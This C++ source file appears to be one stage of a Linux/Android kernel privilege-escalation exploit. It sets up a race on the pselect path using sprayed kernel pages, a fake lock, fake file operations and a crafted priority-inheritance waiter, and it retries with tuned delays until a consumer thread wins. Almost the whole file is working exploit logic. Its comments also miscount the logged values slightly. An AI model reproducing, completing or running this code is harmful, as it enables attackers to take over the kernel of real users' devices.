/** @file jni/pselect_route.cpp
 *  The pselect route, body for body from bddfea4:src/core/fops.c:495-663.
 *
 *  Every file-scope read became a field of PselectRouteInputs; every helper went to a landing or
 *  a parameter (see route_landings.hpp). Two things are kept on purpose though they look wrong:
 *  the reserve/restore around standard io, and the deliberate fd leak when the consumer is
 *  still inflight (step 34). Both are explained where they happen.
 *
 *  Not moved, and recorded here rather than left silent:
 *    -- the original logged twelve values at route setup (attempt, attempts, the waiter
 *       shift, page_base, fake_lock, fake_w0, fake_task, and seven fd_set words). This file
 *       logs four of them: attempt, the shift, page_base and fake_lock. The seven words are
 *       not logged, because they matter only when someone checks the tables word by word;
 *    -- the original called log_sync() right after that line, which this file does not.
 *       log_sync belongs to the log verb, and this tree has its own logging landing.
 *  Both are omissions, not simplifications, and both are stated here on purpose: a silent
 *  omission in a file whose whole claim is "body for body" would be a lie of the worst kind.
 */
#include "jni/pselect_route.hpp"

#include <cerrno>
#include <fcntl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <unistd.h>

#include "support/log.hpp"

namespace ghostlock::jni {
    namespace {
        /** PSELECT_ROUTE_NFDS, without slack: call sites add their own, as the original did. */
        int nfds_of(const PselectTuning &t) noexcept {
            return static_cast<int>(t.pselect_route_nfds);
        }

        /** (NFDS + 63) / 64, from fops.c:343-346; pure arithmetic, not moved verbatim. */
        int words_per_set(const PselectTuning &t) noexcept {
            const int bits_per_word = static_cast<int>(8U * sizeof(unsigned long));
            return (nfds_of(t) + bits_per_word - 1) / bits_per_word;
        }

        /** Word access into an fd_set, from fops.c:333-340. */
        void fdset_put_word(fd_set *set, int word, std::uint64_t value) noexcept {
            auto *bits = reinterpret_cast<unsigned long *>(set);
            bits[word] = static_cast<unsigned long>(value);
        }

        std::uint64_t fdset_get_word(const fd_set *set, int word) noexcept {
            const auto *bits = reinterpret_cast<const unsigned long *>(set);
            return bits[word];
        }

        /** The elapsed milliseconds the two progress lines report. */
        double elapsed_ms(const struct timespec &start) noexcept {
            struct timespec now {};
            (void) ::clock_gettime(CLOCK_MONOTONIC, &now);
            return static_cast<double>(now.tv_sec - start.tv_sec) * 1000.0 +
                   static_cast<double>(now.tv_nsec - start.tv_nsec) / 1000000.0;
        }
    }  // namespace

    void do_kernel5_fake_lock_route(const PselectRouteInputs &inputs, RouteResult &result) noexcept {
        const SprayProducts &products = *inputs.products;
        const SprayOffsets &offsets = *inputs.offsets;
        const PselectTuning &tuning = *inputs.tuning;
        const RouteSeams &ops = *inputs.ops;
        race::RaceFlags &flags = inputs.race->flags;

        if (inputs.addrs.page_base == 0U || inputs.addrs.fake_lock == 0U ||
            inputs.addrs.fake_fops == 0U) {
            result.step = static_cast<std::int32_t>(RouteStep::PselectGuard);
            result.error_number = 0;
            log("warning", "pselect route missing kernel page or lock or fops");
            return;
        }

        struct timespec route_t0 {};
        (void) ::clock_gettime(CLOCK_MONOTONIC, &route_t0);
        int pipefd[2] = {-1, -1};
        if (::pipe(pipefd) != 0) {
            result.step = static_cast<std::int32_t>(RouteStep::PselectGuard);
            result.error_number = errno;
            log("error", "pselect pipe failed", static_cast<std::int64_t>(errno));
            return;
        }

        const bool compact_route = inputs.race->offsets.compact_waiter;
        const int attempts = compact_route ? static_cast<int>(tuning.cfi_route_attempts) : 1;

        std::int32_t calls = 0;
        std::int32_t success = 0;
        bool winner = false;
        bool leak_fds = false;
        for (int attempt = 1; attempt <= attempts; attempt++) {
            if (compact_route && attempt > 1) {
                /* lost race clobbers the page, respray re-derives the fake values too */
                if (!ops.prepare_good_kernel_page(*inputs.products, ops.context)) {
                    result.step = static_cast<std::int32_t>(RouteStep::PselectRetryPrepareFailed);
                    result.error_number = errno;
                    log("warning", "pselect retry page prepare failed",
                        static_cast<std::int64_t>(attempt));
                    break;
                }
            }

            /* park on a never-ready timerfd so the waiter stays stale on the pselect stack
             *  for the consumer window */
            int block_fd = static_cast<int>(::syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0));
            if (block_fd < 0) {
                log("warning", "pselect timerfd_create failed, using pipe read end",
                    static_cast<std::int64_t>(errno));
                block_fd = pipefd[0];
            }
            const int high_read = ::fcntl(block_fd, F_DUPFD, nfds_of(tuning) + 16);
            if (high_read < 0) {
                result.step = static_cast<std::int32_t>(RouteStep::PselectDupFailed);
                result.error_number = errno;
                log("warning", "pselect F_DUPFD read failed", static_cast<std::int64_t>(errno));
                if (block_fd != pipefd[0]) { (void) ::close(block_fd); }
                (void) ::close(pipefd[0]);
                (void) ::close(pipefd[1]);
                return;
            }

            fd_set in {};
            fd_set out {};
            fd_set ex {};
            /* fops.c:445 and :470 were the two branches of one function; they are two calls
             *  here, one per kernel family, each carrying its own table. */
            if (compact_route) {
                fill_fdsets_compact(&in, &out, &ex, words_per_set(tuning), inputs.waiter_shift,
                                    offsets, products, tuning.waiter_prio);
            } else {
                fill_fdsets_rt(&in, &out, &ex, words_per_set(tuning), inputs.waiter_shift,
                               products);
            }
            /* The original logged twelve values here (attempt, attempts, the waiter shift,
             *  page_base, fake_lock, fake_w0, fake_task and seven fd_set words). The three
             *  that say what the window was built from are kept; the seven words are not,
             *  because they only matter when someone is checking the tables word by word.
             *  The omission is stated in the file header as well. */
            /* fops.c:585 logged four values here: attempt, attempts, compact and the elapsed
             *  milliseconds. The log landing takes a few numbers per call, so they arrive in
             *  three calls. */
            log("info", "pselect pre-select", static_cast<std::int64_t>(attempt));
            log("info", "pselect pre-select compact", static_cast<std::int64_t>(compact_route ? 1 : 0));
            log("info", "pselect pre-select elapsed-ms", static_cast<std::int64_t>(elapsed_ms(route_t0)));
            log("info", "pselect route shift", static_cast<std::int64_t>(inputs.waiter_shift));
            log("info", "pselect route page", static_cast<std::int64_t>(products.page_base));
            log("info", "pselect route lock", static_cast<std::int64_t>(products.fake_lock));

            /* The route may replace low fds, including stdout and stderr. */
            if (ops.reserve_standard_io == nullptr || ops.open_selected_fds == nullptr ||
                ops.restore_standard_io == nullptr) {
                result.step = static_cast<std::int32_t>(RouteStep::PselectGuard);
                log("error", "pselect route: a landing is absent");
                (void) ::close(high_read);
                (void) ::close(pipefd[0]);
                (void) ::close(pipefd[1]);
                return;
            }
            ops.reserve_standard_io(ops.context);
            (void) ops.open_selected_fds(&in, &out, &ex, high_read, pipefd[1], ops.context);
            (void) ::close(high_read);

            flags.consumer_calls = 0;
            flags.consumer_success = 0;
            flags.punch_consume_stop = 0;
            /* fops.c:297-315 had three branches here. Non-compact returned
             *  PSELECT_ENTER_DELAY_USEC so select could set up its stack frame before the PI
             *  walk; compact first checked the environment variable PSELECT_DELAY_USEC, which
             *  the execution layer may not read, so a forced value arrives as a field;
             *  otherwise it indexed the table modulo its own length. */
            const std::int32_t delay_usec =
                !compact_route
                    ? static_cast<std::int32_t>(tuning.pselect_enter_delay_usec)
                    : (tuning.delay_override_usec != 0U
                           ? static_cast<std::int32_t>(tuning.delay_override_usec)
                           : static_cast<std::int32_t>(
                                 tuning.delay_table[static_cast<std::size_t>(attempt - 1) %
                                                    PselectTuning::kDelayTableSize]));
            flags.main_route_delay_usec = delay_usec;
            flags.punch_consume_go = attempt;

            errno = 0;
            int ret = -1;
            if (compact_route) {
                struct timespec ts {};
                ts.tv_sec = static_cast<time_t>(tuning.compact_timeout_sec);
                ts.tv_nsec = static_cast<long>(tuning.compact_timeout_usec) * 1000L;
                ret = ::pselect(nfds_of(tuning), &in, &out, &ex, &ts, nullptr);
            } else {
                struct timeval timeout {};
                timeout.tv_sec = static_cast<time_t>(tuning.select_timeout_sec);
                timeout.tv_usec = static_cast<suseconds_t>(tuning.select_timeout_usec);
                ret = ::select(nfds_of(tuning), &in, &out, &ex, &timeout);
            }
            const int saved_errno = errno;
            ops.restore_standard_io(ops.context);
            /* fops.c:609 logged five: attempt, attempts, compact, elapsed, ret. */
            log("info", "pselect post-select", static_cast<std::int64_t>(ret));
            log("info", "pselect post-select attempt", static_cast<std::int64_t>(attempt));
            log("info", "pselect post-select compact", static_cast<std::int64_t>(compact_route ? 1 : 0));
            log("info", "pselect post-select elapsed-ms", static_cast<std::int64_t>(elapsed_ms(route_t0)));
            flags.punch_consume_go = 0;

            /* The PI walk runs on its CPU with the crafted waiter on the stack, so wait the
             *  consumer out before closing the fds. */
            bool consumer_stuck = false;
            if (flags.consumer_inflight != 0) {
                for (std::uint32_t i = 0U;
                     i < tuning.consumer_drain_iterations && flags.consumer_inflight != 0; i++) {
                    ::usleep(tuning.consumer_drain_usec);
                }
                consumer_stuck = flags.consumer_inflight != 0;
            }

            calls = flags.consumer_calls;
            success = flags.consumer_success;
            /* fops.c:625 logged seven: attempt, attempts, ret, saved_errno, calls, success,
             *  delay. */
            log("info", "pselect returned calls", static_cast<std::int64_t>(calls));
            log("info", "pselect returned success", static_cast<std::int64_t>(success));
            log("info", "pselect returned ret", static_cast<std::int64_t>(ret));
            log("info", "pselect returned errno", static_cast<std::int64_t>(saved_errno));
            log("info", "pselect returned delay", static_cast<std::int64_t>(delay_usec));

            if (calls > 0 && success > 0) {
                result.step = 0;
                result.error_number = 0;
                winner = true;
            } else {
                result.step = static_cast<std::int32_t>(RouteStep::PselectAttemptNotWon);
                result.error_number = saved_errno;
            }

            /* open_selected_fds only closes its own F_DUPFD copy */
            if (consumer_stuck) {
                /* stuck in sched_setattr or futex, closing would reclaim objects its syscall
                 *  still uses, leak and let process exit reclaim them */
                result.step = static_cast<std::int32_t>(RouteStep::PselectConsumerStuck);
                log("warning", "pselect consumer still inflight, leaking route fds");
                leak_fds = true;
                break;
            }
            if (block_fd != pipefd[0]) { (void) ::close(block_fd); }
            if (winner) { break; }
        }

        if (!leak_fds) {
            (void) ::close(pipefd[0]);
            (void) ::close(pipefd[1]);
        }

        result.userspace_clean = true;
        /* fops.c:661 logged four: calls, success, step, errno. */
        log("info", "pselect route done calls", static_cast<std::int64_t>(calls));
        log("info", "pselect route done success", static_cast<std::int64_t>(success));
        log("info", "pselect route done step", static_cast<std::int64_t>(result.step));
        log("info", "pselect route done errno", static_cast<std::int64_t>(result.error_number));
    }
}  // namespace ghostlock::jni
